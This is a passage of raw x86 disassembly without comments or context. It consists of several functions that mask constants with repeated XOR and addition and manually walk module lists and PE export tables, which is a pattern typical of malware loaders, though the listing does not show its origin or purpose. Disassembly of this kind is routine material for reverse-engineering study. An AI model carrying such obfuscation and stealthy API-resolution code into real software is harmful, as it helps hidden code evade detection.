  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
